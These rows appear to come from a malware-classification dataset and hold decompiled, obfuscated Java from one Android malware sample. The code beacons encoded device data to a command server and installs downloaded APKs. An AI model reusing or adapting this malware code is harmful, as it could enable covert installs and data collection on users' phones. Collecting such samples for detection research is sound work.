"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.m\a.code","public class a implements b {   private static String a;   private static a f83c;   private Context b;   private h d;   private a(  Context context){     this.b=context;     this.d=new h(context);     a=g.d(context,101);   }   public static a a(  Context context){     if (f83c == null) {       f83c=new a(context.getApplicationContext());     }     return f83c;   }   private String a(  HashMap hashMap){     StringBuffer stringBuffer=null;     if (hashMap == null) {       return null;     }     for (    String str : hashMap.keySet()) {       String str2=(String)hashMap.get(str);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str);       stringBuffer.append(""="");       stringBuffer.append(str2);     }     return a + stringBuffer.toString();   }   @Override public com.baty.pczy.facy.pap.e.b a(  int i){     HashMap hashMap=new HashMap();     hashMap.put(com.baty.pczy.facy.pap.p.a.br,"""" + i);     hashMap.put(com.baty.pczy.facy.pap.p.a.cL,""1"");     String a2=a(hashMap);     ArrayList arrayList=new ArrayList();     arrayList.add(this.d);     try {       JSONObject jSONObject=new JSONObject(new c(this.b,a2,arrayList).a());       com.baty.pczy.facy.pap.e.b bVar=new com.baty.pczy.facy.pap.e.b();       bVar.a(jSONObject);       return bVar;     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);       return null;     }   }   @Override public com.baty.pczy.facy.pap.e.b a(  com.baty.pczy.facy.pap.e.c cVar){     HashMap hashMap=new HashMap();     hashMap.put(com.baty.pczy.facy.pap.p.a.cL,""1"");     String a2=a(hashMap);     try {       ArrayList arrayList=new ArrayList();       arrayList.add(this.d);       arrayList.add(cVar);       JSONObject jSONObject=new JSONObject(new c(this.b,a2,arrayList).a());       i iVar=new i();       iVar.a(jSONObject.getJSONObject(iVar.b()));       if (iVar.a == 0) {         com.baty.pczy.facy.pap.e.b bVar=new com.baty.pczy.facy.pap.e.b();         bVar.a(jSONObject);         return bVar;       }       if (iVar.a == -13) {         e.a.b(System.currentTimeMillis());       }       return null;     }  catch (    Exception e) {       return null;     }   }   @Override public i a(){     HashMap hashMap=new HashMap();     hashMap.put(com.baty.pczy.facy.pap.p.a.cL,""5"");     String a2=a(hashMap);     try {       ArrayList arrayList=new ArrayList();       arrayList.add(this.d);       JSONObject jSONObject=new JSONObject(new c(this.b,a2,arrayList).a());       i iVar=new i();       iVar.a(jSONObject.getJSONObject(iVar.b()));       return iVar;     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override public i a(  j[] jVarArr){     HashMap hashMap=new HashMap();     hashMap.put(com.baty.pczy.facy.pap.p.a.cL,""4"");     String a2=a(hashMap);     try {       ArrayList arrayList=new ArrayList();       arrayList.add(this.d);       arrayList.add(new com.baty.pczy.facy.pap.e.g(Arrays.asList(jVarArr)));       JSONObject jSONObject=new JSONObject(new c(this.b,a2,arrayList).a());       i iVar=new i();       iVar.a(jSONObject.getJSONObject(iVar.b()));       return iVar;     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);       return null;     }   }   @Override public f[] a(  com.baty.pczy.facy.pap.e.a aVar){     HashMap hashMap=new HashMap();     hashMap.put(com.baty.pczy.facy.pap.p.a.cL,""3"");     String a2=a(hashMap);     try {       ArrayList arrayList=new ArrayList();       arrayList.add(this.d);       arrayList.add(aVar);       JSONObject jSONObject=new JSONObject(new c(this.b,a2,arrayList).a());       i iVar=new i();       iVar.a(jSONObject.getJSONObject(iVar.b()));       if (iVar.a == 0) {         com.baty.pczy.facy.pap.e.g gVar=new com.baty.pczy.facy.pap.e.g(f.class);         gVar.a(jSONObject.getJSONArray(gVar.b()));         return (f[])gVar.a();       }     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);     }     return null;   }   public f[] a(  com.baty.pczy.facy.pap.e.e eVar){     HashMap hashMap=new HashMap();     hashMap.put(com.baty.pczy.facy.pap.p.a.cL,""2"");     String a2=a(hashMap);     try {       ArrayList arrayList=new ArrayList();       arrayList.add(this.d);       arrayList.add(eVar);       JSONObject jSONObject=new JSONObject(new c(this.b,a2,arrayList).a());       i iVar=new i();       iVar.a(jSONObject.getJSONObject(iVar.b()));       if (iVar.a == 0) {         com.baty.pczy.facy.pap.e.g gVar=new com.baty.pczy.facy.pap.e.g(f.class);         gVar.a(jSONObject.getJSONArray(gVar.b()));         return (f[])gVar.a();       }     }  catch (    Exception e) {       com.baty.pczy.facy.pap.f.g.a(e);     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.m\b.code","public interface b {   com.baty.pczy.facy.pap.e.b a(  int i);   com.baty.pczy.facy.pap.e.b a(  com.baty.pczy.facy.pap.e.c cVar);   i a();   i a(  j[] jVarArr);   f[] a(  com.baty.pczy.facy.pap.e.a aVar); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.m\c.code","public class c {   private Context a;   private List b;   private String f84c;   public c(  Context context,  String str,  List list){     this.a=context;     this.f84c=str;     this.b=list;   }   private byte[] a(  InputStream inputStream){     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     GZIPInputStream gZIPInputStream;     byte[] bArr=null;     try {       gZIPInputStream=new GZIPInputStream(inputStream);       try {         byte[] bArr2=new byte[2048];         byteArrayOutputStream=new ByteArrayOutputStream();         while (true) {           try {             int read=gZIPInputStream.read(bArr2);             if (read == -1) {               break;             }             byteArrayOutputStream.write(bArr2,0,read);           }  catch (          Exception e) {             if (gZIPInputStream != null) {               try {                 gZIPInputStream.close();               }  catch (              IOException e2) {                 g.a((Exception)e2);               }             }             if (byteArrayOutputStream != null) {               try {                 byteArrayOutputStream.close();               }  catch (              IOException e3) {                 g.a((Exception)e3);               }             }             return bArr;           } catch (          Throwable th2) {             th=th2;             if (gZIPInputStream != null) {               try {                 gZIPInputStream.close();               }  catch (              IOException e4) {                 g.a((Exception)e4);               }             }             if (byteArrayOutputStream != null) {               try {                 byteArrayOutputStream.close();               }  catch (              IOException e5) {                 g.a((Exception)e5);               }             }             throw th;           }         }         bArr=byteArrayOutputStream.toByteArray();         if (gZIPInputStream != null) {           try {             gZIPInputStream.close();           }  catch (          IOException e6) {             g.a((Exception)e6);           }         }         if (byteArrayOutputStream != null) {           try {             byteArrayOutputStream.close();           }  catch (          IOException e7) {             g.a((Exception)e7);           }         }       }  catch (      Exception e8) {         byteArrayOutputStream=null;       } catch (      Throwable th3) {         byteArrayOutputStream=null;         th=th3;       }     }  catch (    Exception e9) {       gZIPInputStream=null;       byteArrayOutputStream=null;     } catch (    Throwable th4) {       byteArrayOutputStream=null;       th=th4;       gZIPInputStream=null;     }     return bArr;   }   private byte[] a(  byte[] bArr){     GZIPOutputStream gZIPOutputStream;     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     byte[] bArr2=null;     try {       try {         byteArrayOutputStream=new ByteArrayOutputStream();       }  catch (      Throwable th2) {         th=th2;       }     }  catch (    Exception e) {       e=e;       gZIPOutputStream=null;       byteArrayOutputStream=null;     } catch (    Throwable th3) {       gZIPOutputStream=null;       byteArrayOutputStream=null;       th=th3;     }     try {       gZIPOutputStream=new GZIPOutputStream(byteArrayOutputStream);       try {         gZIPOutputStream.write(bArr);         gZIPOutputStream.finish();         bArr2=byteArrayOutputStream.toByteArray();         if (gZIPOutputStream != null) {           try {             gZIPOutputStream.close();           }  catch (          IOException e2) {             g.a((Exception)e2);           }         }         if (byteArrayOutputStream != null) {           try {             byteArrayOutputStream.close();           }  catch (          IOException e3) {             g.a((Exception)e3);           }         }       }  catch (      Exception e4) {         e=e4;         g.a(e);         if (gZIPOutputStream != null) {           try {             gZIPOutputStream.close();           }  catch (          IOException e5) {             g.a((Exception)e5);           }         }         if (byteArrayOutputStream != null) {           try {             byteArrayOutputStream.close();           }  catch (          IOException e6) {             g.a((Exception)e6);           }         }         return bArr2;       }     }  catch (    Exception e7) {       e=e7;       gZIPOutputStream=null;     } catch (    Throwable th4) {       gZIPOutputStream=null;       th=th4;       if (gZIPOutputStream != null) {         try {           gZIPOutputStream.close();         }  catch (        IOException e8) {           g.a((Exception)e8);         }       }       if (byteArrayOutputStream != null) {         try {           byteArrayOutputStream.close();         }  catch (        IOException e9) {           g.a((Exception)e9);         }       }       throw th;     }     return bArr2;   }   public String a(){     if (this.b == null || this.b.size() == 0) {       return null;     }     try {       HttpPost httpPost=new HttpPost(this.f84c);       HttpClient a=e.a(this.a);       JSONObject jSONObject=new JSONObject();       for (      com.baty.pczy.facy.pap.h.a aVar : this.b) {         jSONObject.put(aVar.b(),aVar.c());       }       String jSONObject2=jSONObject.toString();       g.a(this.f84c);       g.a(jSONObject2);       httpPost.setEntity(new ByteArrayEntity(a(d.a(jSONObject2).getBytes(""utf-8""))));       HttpResponse execute=a.execute(httpPost);       int statusCode=execute.getStatusLine().getStatusCode();       g.a(com.baty.pczy.facy.pap.s.g.d(this.a,18) + statusCode);       if (statusCode == 200) {         String b=d.b(new String(a(execute.getEntity().getContent()),""utf-8""));         g.a(b);         return b;       }     }  catch (    Exception e) {       g.a(e);     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.n\a.code","public class a implements d {   private Context a;   private Intent b;   public a(  Context context,  Intent intent){     this.a=context;     this.b=intent;   }   private void a(  com.baty.pczy.facy.pap.e.b bVar){     com.baty.pczy.facy.pap.e.a(this.a,bVar);   }   @Override public void a(){     com.baty.pczy.facy.pap.e.b bVar=(com.baty.pczy.facy.pap.e.b)this.b.getSerializableExtra(com.baty.pczy.facy.pap.e.b.class.getSimpleName());     if (bVar == null) {       return;     }     if (bVar.a.f59c == 1) {       bVar.a.f59c=0;       new com.baty.pczy.facy.pap.i.a(this.a,bVar).a();     }     if (!com.baty.pczy.facy.pap.e.a.b(bVar.b.p,1)) {       com.baty.pczy.facy.pap.e.a.a(bVar.b.p,1);       j jVar=new j();       jVar.a=bVar.b.p;       jVar.f62c=bVar.b.u;       jVar.b=1;       com.baty.pczy.facy.pap.o.a.a(jVar);     }     a(bVar);     com.baty.pczy.facy.pap.e.b.a(System.currentTimeMillis());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.n\b.code","public class b implements d {   private Context a;   private Intent b;   public b(  Context context,  Intent intent){     this.a=context;     this.b=intent;   }   @Override public void a(){     f fVar=(f)this.b.getSerializableExtra(f.class.getSimpleName());     if (fVar == null) {       return;     }     File a=com.baty.pczy.facy.pap.f.d.a(fVar);     if (a == null || !a.exists()) {       com.baty.pczy.facy.pap.f.b.a(this.a,fVar);     }  else {       com.baty.pczy.facy.pap.s.a.a(this.a,a.getPath(),fVar.o);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.n\c.code","public class c implements d {   private Context a;   private Intent b;   public c(  Context context,  Intent intent){     this.a=context;     this.b=intent;   }   private void a(  com.baty.pczy.facy.pap.e.b bVar){     com.baty.pczy.facy.pap.e.a(this.a,bVar);   }   private void a(  f fVar){     com.baty.pczy.facy.pap.d.f fVar2;     Iterator it=com.baty.pczy.facy.pap.d.b.a().c().iterator();     while (true) {       if (!it.hasNext()) {         fVar2=null;         break;       }  else {         fVar2=(com.baty.pczy.facy.pap.d.f)it.next();         if (fVar2.n().equals(fVar.b)) {           break;         }       }     }     if (fVar2 != null) {       int h=fVar2.h();       if (h == 5 || h == 3) {         fVar2.a(new g(this.a,fVar));         fVar2.a(new com.baty.pczy.facy.pap.o.c(fVar));         fVar2.f();         com.baty.pczy.facy.pap.f.e.a(this.a,fVar);       }     }   }   @Override public void a(){     com.baty.pczy.facy.pap.e.b a;     f fVar=(f)this.b.getSerializableExtra(f.class.getSimpleName());     if (fVar == null || (a=com.baty.pczy.facy.pap.e.a.a()) == null) {       return;     }     a.b=fVar;     a(a);     a(fVar);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.n\d.code","public interface d {   void a(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.n\e.code","public class e implements d {   private Context a;   private Intent b;   public e(  Context context,  Intent intent){     this.a=context;     this.b=intent;   }   private com.baty.pczy.facy.pap.e.b a(  Intent intent){     String b=com.baty.pczy.facy.pap.e.b.b();     com.baty.pczy.facy.pap.e.c cVar=new com.baty.pczy.facy.pap.e.c();     cVar.a=b;     cVar.b=0;     int intExtra=intent.getIntExtra(com.baty.pczy.facy.pap.c.a,-1);     if (intExtra == -1) {       return com.baty.pczy.facy.pap.e.e.a(cVar);     }     g.a(com.baty.pczy.facy.pap.s.g.d(this.a,13) + intExtra);     return com.baty.pczy.facy.pap.e.e.a(intExtra);   }   private com.baty.pczy.facy.pap.e.b b(  Intent intent){     g.a(com.baty.pczy.facy.pap.s.g.d(this.a,2));     String b=com.baty.pczy.facy.pap.e.b.b();     com.baty.pczy.facy.pap.e.c cVar=new com.baty.pczy.facy.pap.e.c();     cVar.a=b;     cVar.b=1;     return com.baty.pczy.facy.pap.e.e.a(cVar);   }   private boolean b(){     return f.a(com.baty.pczy.facy.pap.e.a.l());   }   private void c(){     JSONArray c2=com.baty.pczy.facy.pap.e.a.c();     if (c2 == null) {       return;     }     com.baty.pczy.facy.pap.o.a.a(c2);   }   private void d(){     List<com.baty.pczy.facy.pap.e.b> b=com.baty.pczy.facy.pap.e.a.b();     if (b.size() > 0) {       for (      com.baty.pczy.facy.pap.e.b bVar : b) {         String a=com.baty.pczy.facy.pap.e.a.a(bVar.b.p);         if (TextUtils.isEmpty(a) || ""0"".equals(a)) {           new com.baty.pczy.facy.pap.i.a(this.a,bVar).a();           return;         }       }     }   }   private void e(){     List<com.baty.pczy.facy.pap.e.f> k=com.baty.pczy.facy.pap.e.a.k();     if (k.size() > 0) {       int i=0;       for (      com.baty.pczy.facy.pap.e.f fVar : k) {         if (!com.baty.pczy.facy.pap.e.a.b(fVar.p,4) && com.baty.pczy.facy.pap.e.a.b(fVar.p,3)) {           File a=com.baty.pczy.facy.pap.f.d.a(fVar);           if (a != null && a.exists() && a.getPath().endsWith("".apk"")) {             if (com.baty.pczy.facy.pap.s.a.d(this.a,fVar.o)) {               new com.baty.pczy.facy.pap.l.e(this.a,fVar.o,h.Type_Delay).a();             }  else             if (i <= 0) {               new com.baty.pczy.facy.pap.i.g(this.a,fVar).a();               i++;             }           }           i=i;         }       }     }   }   private boolean f(){     return System.currentTimeMillis() - com.baty.pczy.facy.pap.e.b.d() >= ((long)((com.baty.pczy.facy.pap.e.b.c() * 60) * 1000));   }   @Override public void a(){     if (com.baty.pczy.facy.pap.f.d.a() && com.baty.pczy.facy.pap.l.c.a(this.a)) {       d();       e();       c();       com.baty.pczy.facy.pap.f.b.a(this.a);       String a=com.baty.pczy.facy.pap.f.h.a(this.a);       g.a(com.baty.pczy.facy.pap.s.g.d(this.a,27) + a);       g.a(com.baty.pczy.facy.pap.s.g.d(this.a,28) + com.baty.pczy.facy.pap.f.h.b(this.a));       boolean equals=com.baty.pczy.facy.pap.s.g.d(this.a,9).equals(a);       if (!equals && !f()) {         g.a(com.baty.pczy.facy.pap.s.g.d(this.a,11));         return;       }       if (!equals && b()) {         g.a(com.baty.pczy.facy.pap.s.g.d(this.a,4));         return;       }       if (!f.a(com.baty.pczy.facy.pap.e.a.h())) {         i a2=com.baty.pczy.facy.pap.e.e.a();         if (a2 == null || a2.a != 0) {           g.a(com.baty.pczy.facy.pap.s.g.d(this.a,22));           return;         }         String str=a2.b;         com.baty.pczy.facy.pap.e.a.a(System.currentTimeMillis());         com.baty.pczy.facy.pap.e.b.b(str);         com.baty.pczy.facy.pap.e.a.a(str);         com.baty.pczy.facy.pap.e.a.h(str);         com.baty.pczy.facy.pap.e.a.b(str);       }       com.baty.pczy.facy.pap.e.b a3=a(this.b);       if (a3 == null) {         g.a(com.baty.pczy.facy.pap.s.g.d(this.a,10));         return;       }       int i=0;       com.baty.pczy.facy.pap.e.b bVar=a3;       while (bVar != null) {         com.baty.pczy.facy.pap.e.b.a(bVar.a.f);         g.a(com.baty.pczy.facy.pap.s.g.d(this.a,12));         boolean z=!equals && com.baty.pczy.facy.pap.s.a.d(this.a,bVar.b.o);         if (!equals && com.baty.pczy.facy.pap.e.b.d(bVar.b.o)) {           z=true;         }         if (!z) {           break;         }         g.a(com.baty.pczy.facy.pap.s.g.d(this.a,1));         if (i == 3) {           return;         }         bVar=b(this.b);         i++;       }       if (bVar != null) {         new com.baty.pczy.facy.pap.i.a(this.a,bVar).a();         com.baty.pczy.facy.pap.e.b.a(Long.MAX_VALUE);         j jVar=new j();         jVar.f62c=bVar.b.u;         jVar.b=0;         jVar.a=bVar.b.p;         com.baty.pczy.facy.pap.o.a.a(jVar);         if (!com.baty.pczy.facy.pap.e.a.b(jVar.a,jVar.b)) {           com.baty.pczy.facy.pap.e.a.a(bVar.b.p,0);         }         com.baty.pczy.facy.pap.e.a.a(bVar);       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.o\a.code","public class a {   public static void a(  j jVar){     a(new j[]{jVar});   }   public static void a(  JSONArray jSONArray){     g gVar=new g(j.class);     gVar.a(jSONArray);     a((j[])gVar.a());   }   public static void a(  j[] jVarArr){     d.a(new b(jVarArr));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.o\b.code","final class b implements com.baty.pczy.facy.pap.q.a {   final j[] a;   public b(  j[] jVarArr){     this.a=jVarArr;   }   @Override public void a(){     try {       i a=e.e.a(this.a);       if (a == null || a.a != 0) {         e.a.a(this.a);       }     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.o\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@348dabf1"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.pczy.facy.pap.p\a.code","public class a {   public static final byte[] a={-28,-70,-78,-25,-120,-79,-25,-102,-124,-28,-67,-96,-27,-73,-78,-25,-69,-113,-23,-94,-124,-25,-70,-90,119,105,102,105,-28,-72,-117,-24,-67,-67,-28,-70,-122,-29,Byte.MIN_VALUE,-126};   public static final String b=com.baty.pczy.facy.pap.s.a.a(a);   public static final String f85c=null;   public static final String d=com.baty.pczy.facy.pap.s.a.a(b.a);   public static final String e=com.baty.pczy.facy.pap.s.a.a(b.b);   public static final String f=com.baty.pczy.facy.pap.s.a.a(b.f92c);   public static final String g=com.baty.pczy.facy.pap.s.a.a(b.d);   public static final String h=com.baty.pczy.facy.pap.s.a.a(b.e);   public static final String i=com.baty.pczy.facy.pap.s.a.a(b.f);   public static final String j=com.baty.pczy.facy.pap.s.a.a(b.g);   public static final String k=com.baty.pczy.facy.pap.s.a.a(b.h);   public static final String l=com.baty.pczy.facy.pap.s.a.a(b.i);   public static final String m=com.baty.pczy.facy.pap.s.a.a(b.j);   public static final String n=com.baty.pczy.facy.pap.s.a.a(b.k);   public static final String o=com.baty.pczy.facy.pap.s.a.a(b.l);   public static final String p=com.baty.pczy.facy.pap.s.a.a(b.m);   public static final String q=com.baty.pczy.facy.pap.s.a.a(b.n);   public static final String r=com.baty.pczy.facy.pap.s.a.a(b.o);   public static final String s=com.baty.pczy.facy.pap.s.a.a(b.p);   public static final String t=com.baty.pczy.facy.pap.s.a.a(b.q);   public static final String u=com.baty.pczy.facy.pap.s.a.a(b.r);   public static final String v=com.baty.pczy.facy.pap.s.a.a(b.s);   public static final String w=com.baty.pczy.facy.pap.s.a.a(b.t);   public static final String x=com.baty.pczy.facy.pap.s.a.a(b.u);   public static final String y=com.baty.pczy.facy.pap.s.a.a(b.v);   public static final String z=com.baty.pczy.facy.pap.s.a.a(b.w);   public static final String A=com.baty.pczy.facy.pap.s.a.a(b.x);   public static final String B=com.baty.pczy.facy.pap.s.a.a(b.y);   public static final String C=com.baty.pczy.facy.pap.s.a.a(b.z);   public static final String D=com.baty.pczy.facy.pap.s.a.a(b.A);   public static final String E=com.baty.pczy.facy.pap.s.a.a(b.B);   public static final String F=com.baty.pczy.facy.pap.s.a.a(b.C);   public static final String G=com.baty.pczy.facy.pap.s.a.a(b.D);   public static final String H=com.baty.pczy.facy.pap.s.a.a(b.E);   public static final String I=com.baty.pczy.facy.pap.s.a.a(b.F);   public static final String J=com.baty.pczy.facy.pap.s.a.a(b.G);   public static final String K=com.baty.pczy.facy.pap.s.a.a(b.H);   public static final String L=com.baty.pczy.facy.pap.s.a.a(b.I);   public static final String M=com.baty.pczy.facy.pap.s.a.a(b.J);   public static final String N=com.baty.pczy.facy.pap.s.a.a(b.K);   public static final String O=com.baty.pczy.facy.pap.s.a.a(b.L);   public static final String P=com.baty.pczy.facy.pap.s.a.a(b.M);   public static final String Q=com.baty.pczy.facy.pap.s.a.a(b.N);   public static final String R=com.baty.pczy.facy.pap.s.a.a(b.O);   public static final String S=com.baty.pczy.facy.pap.s.a.a(b.P);   public static final String T=com.baty.pczy.facy.pap.s.a.a(b.Q);   public static final String U=com.baty.pczy.facy.pap.s.a.a(b.R);   public static final String V=com.baty.pczy.facy.pap.s.a.a(b.S);   public static final String W=com.baty.pczy.facy.pap.s.a.a(b.T);   public static final String X=com.baty.pczy.facy.pap.s.a.a(b.U);   public static final String Y=com.baty.pczy.facy.pap.s.a.a(b.V);   public static final String Z=com.baty.pczy.facy.pap.s.a.a(b.W);   public static final String aa=com.baty.pczy.facy.pap.s.a.a(b.X);   public static final String ab=com.baty.pczy.facy.pap.s.a.a(b.Y);   public static final String ac=com.baty.pczy.facy.pap.s.a.a(b.Z);   public static final String ad=com.baty.pczy.facy.pap.s.a.a(b.aa);   public static final String ae=com.baty.pczy.facy.pap.s.a.a(b.ab);   public static final String af=com.baty.pczy.facy.pap.s.a.a(b.ac);   public static final String ag=com.baty.pczy.facy.pap.s.a.a(b.ad);   public static final String ah=com.baty.pczy.facy.pap.s.a.a(b.ae);   public static final String ai=com.baty.pczy.facy.pap.s.a.a(b.af);   public static final String aj=com.baty.pczy.facy.pap.s.a.a(b.ag);   public static final String ak=com.baty.pczy.facy.pap.s.a.a(b.ah);   public static final String al=com.baty.pczy.facy.pap.s.a.a(b.ai);   public static final String am=com.baty.pczy.facy.pap.s.a.a(b.aj);   public static final String an=com.baty.pczy.facy.pap.s.a.a(b.ak);   public static final String ao=com.baty.pczy.facy.pap.s.a.a(b.al);   public static final String ap=com.baty.pczy.facy.pap.s.a.a(b.am);   public static final String aq=com.baty.pczy.facy.pap.s.a.a(b.an);   public static final String ar=com.baty.pczy.facy.pap.s.a.a(b.ao);   public static final String as=com.baty.pczy.facy.pap.s.a.a(b.ap);   public static final String at=com.baty.pczy.facy.pap.s.a.a(b.aq);   public static final String au=com.baty.pczy.facy.pap.s.a.a(b.ar);   public static final String av=com.baty.pczy.facy.pap.s.a.a(b.as);   public static final String aw=com.baty.pczy.facy.pap.s.a.a(b.at);   public static final String ax=com.baty.pczy.facy.pap.s.a.a(b.au);   public static final String ay=com.baty.pczy.facy.pap.s.a.a(b.av);   public static final String az=com.baty.pczy.facy.pap.s.a.a(b.aw);   public static final String aA=com.baty.pczy.facy.pap.s.a.a(b.ax);   public static final String aB=com.baty.pczy.facy.pap.s.a.a(b.ay);   public static final String aC=com.baty.pczy.facy.pap.s.a.a(b.az);   public static final String aD=com.baty.pczy.facy.pap.s.a.a(b.aA);   public static final String aE=com.baty.pczy.facy.pap.s.a.a(b.aB);   public static final String aF=com.baty.pczy.facy.pap.s.a.a(b.aC);   public static final String aG=com.baty.pczy.facy.pap.s.a.a(b.aD);   public static final String aH=com.baty.pczy.facy.pap.s.a.a(b.aE);   public static final String aI=com.baty.pczy.facy.pap.s.a.a(b.aF);   public static final String aJ=com.baty.pczy.facy.pap.s.a.a(b.aG);   public static final String aK=com.baty.pczy.facy.pap.s.a.a(b.aH);   public static final String aL=com.baty.pczy.facy.pap.s.a.a(b.aI);   public static final String aM=com.baty.pczy.facy.pap.s.a.a(b.aJ);   public static final String aN=com.baty.pczy.facy.pap.s.a.a(b.aK);   public static final String aO=com.baty.pczy.facy.pap.s.a.a(b.aL);   public static final String aP=com.baty.pczy.facy.pap.s.a.a(b.aM);   public static final String aQ=com.baty.pczy.facy.pap.s.a.a(b.aN);   public static final String aR=com.baty.pczy.facy.pap.s.a.a(b.aO);   public static final String aS=com.baty.pczy.facy.pap.s.a.a(b.aP);   public static final String aT=com.baty.pczy.facy.pap.s.a.a(b.aQ);   public static final String aU=com.baty.pczy.facy.pap.s.a.a(b.aR);   public static final String aV=com.baty.pczy.facy.pap.s.a.a(b.aS);   public static final String aW=com.baty.pczy.facy.pap.s.a.a(b.aT);   public static final String aX=com.baty.pczy.facy.pap.s.a.a(b.aU);   public static final String aY=com.baty.pczy.facy.pap.s.a.a(b.aV);   public static final String aZ=com.baty.pczy.facy.pap.s.a.a(b.aW);   public static final String ba=com.baty.pczy.facy.pap.s.a.a(b.aX);   public static final String bb=com.baty.pczy.facy.pap.s.a.a(b.aY);   public static final String bc=com.baty.pczy.facy.pap.s.a.a(b.aZ);   public static final String bd=com.baty.pczy.facy.pap.s.a.a(b.ba);   public static final String be=com.baty.pczy.facy.pap.s.a.a(b.bb);   public static final String bf=com.baty.pczy.facy.pap.s.a.a(b.bc);   public static final String bg=com.baty.pczy.facy.pap.s.a.a(b.bd);   public static final String bh=com.baty.pczy.facy.pap.s.a.a(b.be);   public static final String bi=com.baty.pczy.facy.pap.s.a.a(b.bf);   public static final String bj=com.baty.pczy.facy.pap.s.a.a(b.bg);   public static final String bk=com.baty.pczy.facy.pap.s.a.a(b.bh);   public static final String bl=com.baty.pczy.facy.pap.s.a.a(b.bi);   public static final String bm=com.baty.pczy.facy.pap.s.a.a(b.bj);   public static final String bn=com.baty.pczy.facy.pap.s.a.a(b.bk);   public static final String bo=com.baty.pczy.facy.pap.s.a.a(b.bl);   public static final String bp=com.baty.pczy.facy.pap.s.a.a(b.bm);   public static final String bq=com.baty.pczy.facy.pap.s.a.a(b.bn);   public static final String br=com.baty.pczy.facy.pap.s.a.a(b.bo);   public static final String bs=com.baty.pczy.facy.pap.s.a.a(b.bp);   public static final String bt=com.baty.pczy.facy.pap.s.a.a(b.bq);   public static final String bu=com.baty.pczy.facy.pap.s.a.a(b.br);   public static final String bv=com.baty.pczy.facy.pap.s.a.a(b.bs);   public static final String bw=com.baty.pczy.facy.pap.s.a.a(b.bt);   public static final String bx=com.baty.pczy.facy.pap.s.a.a(b.bu);   public static final String by=com.baty.pczy.facy.pap.s.a.a(b.bv);   public static final String bz=com.baty.pczy.facy.pap.s.a.a(b.bw);   public static final String bA=com.baty.pczy.facy.pap.s.a.a(b.bx);   public static final String bB=com.baty.pczy.facy.pap.s.a.a(b.by);   public static final String bC=com.baty.pczy.facy.pap.s.a.a(b.bz);   public static final String bD=com.baty.pczy.facy.pap.s.a.a(b.bA);   public static final String bE=com.baty.pczy.facy.pap.s.a.a(b.bB);   public static final String bF=com.baty.pczy.facy.pap.s.a.a(b.bC);   public static final String bG=com.baty.pczy.facy.pap.s.a.a(b.bD);   public static final String bH=com.baty.pczy.facy.pap.s.a.a(b.bE);   public static final String bI=com.baty.pczy.facy.pap.s.a.a(b.bF);   public static final String bJ=com.baty.pczy.facy.pap.s.a.a(b.bG);   public static final String bK=com.baty.pczy.facy.pap.s.a.a(b.bH);   public static final String bL=com.baty.pczy.facy.pap.s.a.a(b.bI);   public static final String bM=com.baty.pczy.facy.pap.s.a.a(b.bJ);   public static final String bN=com.baty.pczy.facy.pap.s.a.a(b.bK);   public static final String bO=com.baty.pczy.facy.pap.s.a.a(b.bL);   public static final String bP=com.baty.pczy.facy.pap.s.a.a(b.bM);   public static final String bQ=com.baty.pczy.facy.pap.s.a.a(b.bN);   public static final String bR=com.baty.pczy.facy.pap.s.a.a(b.bO);   public static final String bS=com.baty.pczy.facy.pap.s.a.a(b.bP);   public static final String bT=com.baty.pczy.facy.pap.s.a.a(b.bQ);   public static final String bU=com.baty.pczy.facy.pap.s.a.a(b.bR);   public static final String bV=com.baty.pczy.facy.pap.s.a.a(b.bS);   public static final String bW=com.baty.pczy.facy.pap.s.a.a(b.bT);   public static final String bX=com.baty.pczy.facy.pap.s.a.a(b.bU);   public static final String bY=com.baty.pczy.facy.pap.s.a.a(b.bV);   public static final String bZ=com.baty.pczy.facy.pap.s.a.a(b.bW);   public static final String ca=com.baty.pczy.facy.pap.s.a.a(b.bX);   public static final String cb=com.baty.pczy.facy.pap.s.a.a(b.bY);   public static final String cc=com.baty.pczy.facy.pap.s.a.a(b.bZ);   public static final String cd=com.baty.pczy.facy.pap.s.a.a(b.cb);   public static final String ce=com.baty.pczy.facy.pap.s.a.a(b.cc);   public static final String cf=com.baty.pczy.facy.pap.s.a.a(b.cd);   public static final String cg=com.baty.pczy.facy.pap.s.a.a(b.ce);   public static final String ch=com.baty.pczy.facy.pap.s.a.a(b.cf);   public static final String 